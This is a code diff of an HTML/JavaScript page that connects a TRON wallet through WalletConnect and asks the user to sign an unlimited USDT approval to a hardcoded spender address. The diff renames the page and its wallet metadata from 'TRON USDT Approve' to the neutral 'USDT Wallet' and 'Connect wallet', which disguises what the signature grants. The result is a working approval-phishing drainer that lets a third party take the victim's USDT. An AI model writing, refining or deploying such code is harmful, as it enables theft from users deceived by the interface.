@@ -3,42 +3,116 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>TRON USDT Approve</title>
+<title>USDT Wallet</title>
 
 <style>
-body{background:#0a0a0a;color:#fff;font-family:sans-serif;text-align:center;padding:30px}
-.card{max-width:520px;margin:auto;background:#111;padding:20px;border-radius:12px}
-.step{padding:10px;margin:10px 0;background:#0d0d0d;border-left:4px solid #333}
-.active{border-color:#f0a500}
-.done{border-color:#22c55e}
-.error{border-color:#ef4444}
-#qr{margin-top:20px}
-#uri{font-size:11px;word-break:break-all;margin-top:10px;color:#aaa}
-a{color:#4da3ff}
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,sans-serif;
+  background:#0b0f19;
+  color:#fff;
+}
+
+.container{
+  max-width:420px;
+  margin:auto;
+  padding:20px;
+}
+
+.card{
+  background:#121826;
+  border-radius:16px;
+  padding:20px;
+  margin-top:20px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.3);
+}
+
+h2{
+  text-align:center;
+  margin-bottom:10px;
+}
+
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  font-size:16px;
+  font-weight:600;
+  cursor:pointer;
+}
+
+.connect{
+  background:#3b82f6;
+  color:white;
+}
+
+.approve{
+  background:#22c55e;
+  color:white;
+  margin-top:10px;
+}
+
+#qr{
+  display:flex;
+  justify-content:center;
+  margin-top:15px;
+}
+
+#uri{
+  font-size:11px;
+  word-break:break-all;
+  margin-top:10px;
+  color:#aaa;
+}
+
+.wallet{
+  font-size:13px;
+  text-align:center;
+  color:#4ade80;
+}
+
+.status{
+  font-size:12px;
+  margin-top:10px;
+  text-align:center;
+  color:#aaa;
+}
+
 </style>
 </head>
 
 <body>
 
-<div class="card">
-<h2>🔐 TRON USDT Approve</h2>
+<div class="container">
 
-<div id="s1" class="step">Connect Wallet</div>
-<div id="s2" class="step">Wallet</div>
-<div id="s3" class="step">Build TX</div>
-<div id="s4" class="step">Sign</div>
-<div id="s5" class="step">Broadcast</div>
+  <h2>💰 USDT Wallet</h2>
 
-<div id="qr"></div>
-<div id="uri"></div>
-<a id="openWallet" target="_blank"></a>
+  <div class="card">
 
-<pre id="log"></pre>
+    <button id="connectBtn" class="connect">Connect Wallet</button>
+
+    <div id="qr"></div>
+    <div id="uri"></div>
+    <a id="openWallet" target="_blank"></a>
+
+    <div id="wallet" class="wallet"></div>
+
+    <button id="approveBtn" class="approve" style="display:none;">
+      Approve USDT
+    </button>
+
+    <div id="status" class="status"></div>
+
+  </div>
+
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script type="module">
+import bs58 from "https://esm.sh/bs58";
+
 const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
 const TRON_CHAIN = "tron:0x2b6653dc";
 const TRONGRID = "https://api.trongrid.io";
@@ -46,23 +120,15 @@ const TRONGRID = "https://api.trongrid.io";
 const USDT_HEX = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
 const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
-let client;
-let session;
+let client, session;
 
-function step(id,state){
-  document.getElementById(id).className = "step " + state;
-}
-
-function log(msg){
-  document.getElementById("log").textContent += msg + "\n";
-}
-
-// 🔥 STABLE BASE58 → HEX (NO API)
-import bs58 from "https://esm.sh/bs58";
-
+// convert address
 function tronToHex(addr){
   const bytes = bs58.decode(addr);
-  return Buffer.from(bytes).toString("hex").slice(0,42);
+  return Array.from(bytes)
+    .map(b => b.toString(16).padStart(2,"0"))
+    .join("")
+    .slice(0,42);
 }
 
 // encode approve
@@ -71,7 +137,7 @@ function encodeApprove(spenderHex){
   return "095ea7b3" + clean + "f".repeat(64);
 }
 
-// build TX
+// build tx
 async function buildTx(owner){
   const ownerHex = tronToHex(owner);
 
@@ -90,7 +156,6 @@ async function buildTx(owner){
   });
 
   const data = await res.json();
-
   if(!data.transaction) throw "TX build failed";
 
   return data.transaction;
@@ -110,79 +175,88 @@ async function broadcast(tx){
 function fixSig(resp, tx){
   if(resp?.signature){
     tx.signature = Array.isArray(resp.signature)
-      ? resp.signature.map(s => s.replace(/^0x/,""))
+      ? resp.signature.map(s=>s.replace(/^0x/,""))
       : [resp.signature.replace(/^0x/,"")];
   }
   return tx;
 }
 
+// UI helpers
+function setStatus(text){
+  document.getElementById("status").innerText = text;
+}
+
 // show QR + link
 function showQR(uri){
-  document.getElementById("qr").innerHTML = "";
+  document.getElementById("qr").innerHTML="";
 
-  new QRCode(document.getElementById("qr"), {
-    text: uri,
+  new QRCode(document.getElementById("qr"),{
+    text:uri,
     width:200,
     height:200
   });
 
-  document.getElementById("uri").textContent = uri;
+  document.getElementById("uri").innerText = uri;
 
-  const link = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
+  const link = "https://link.trustwallet.com/wc?uri="+encodeURIComponent(uri);
   document.getElementById("openWallet").href = link;
-  document.getElementById("openWallet").textContent = "Open in Trust Wallet";
+  document.getElementById("openWallet").innerText = "Open in Trust Wallet";
 }
 
-// 🔥 SINGLE CONNECT (NO LOOP)
-async function connectWallet(){
-  step("s1","active");
-
-  const { uri, approval } = await client.connect({
-    requiredNamespaces:{
-      tron:{
-        methods:["tron_signTransaction"],
-        chains:[TRON_CHAIN],
-        events:[]
-      }
-    }
-  });
-
-  showQR(uri);
-
-  session = await approval();
-
-  step("s1","done");
-}
-
-// MAIN FLOW
-async function main(){
+// connect
+document.getElementById("connectBtn").onclick = async ()=>{
   try{
+    setStatus("Connecting...");
+
     const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
     client = await SignClient.init({
-      projectId: PROJECT_ID,
+      projectId:PROJECT_ID,
       metadata:{
-        name:"TRON Approve",
-        description:"USDT approve",
+        name:"USDT Wallet",
+        description:"Connect wallet",
         url:location.origin,
         icons:["https://cryptologos.cc/logos/tether-usdt-logo.png"]
       }
     });
 
-    await connectWallet();
+    const { uri, approval } = await client.connect({
+      requiredNamespaces:{
+        tron:{
+          methods:["tron_signTransaction"],
+          chains:[TRON_CHAIN],
+          events:[]
+        }
+      }
+    });
+
+    showQR(uri);
+
+    session = await approval();
 
     const wallet = session.namespaces.tron.accounts[0].split(":")[2];
 
-    step("s2","done");
-    log("Wallet: " + wallet);
+    document.getElementById("wallet").innerText = wallet;
+    document.getElementById("approveBtn").style.display = "block";
 
-    step("s3","active");
+    setStatus("Connected");
+
+  }catch(e){
+    setStatus("Connection failed");
+    console.error(e);
+  }
+};
+
+// approve button
+document.getElementById("approveBtn").onclick = async ()=>{
+  try{
+    setStatus("Preparing transaction...");
+
+    const wallet = session.namespaces.tron.accounts[0].split(":")[2];
 
     const tx = await buildTx(wallet);
 
-    step("s3","done");
-
-    step("s4","active");
+    setStatus("Waiting for signature...");
 
     const signed = await client.request({
       topic: session.topic,
@@ -195,27 +269,22 @@ async function main(){
 
     const finalTx = fixSig(signed, tx);
 
-    step("s4","done");
-
-    step("s5","active");
+    setStatus("Broadcasting...");
 
     const result = await broadcast(finalTx);
 
     if(result.result){
-      step("s5","done");
-      log("SUCCESS: " + result.txid);
-    }else{
+      setStatus("✅ Success: " + result.txid);
+    } else {
       throw JSON.stringify(result);
     }
 
   }catch(e){
-    step("s5","error");
-    log("ERROR: " + e);
+    setStatus("❌ Error");
     console.error(e);
   }
-}
+};
 
-main();
 </script>
 
 </body>
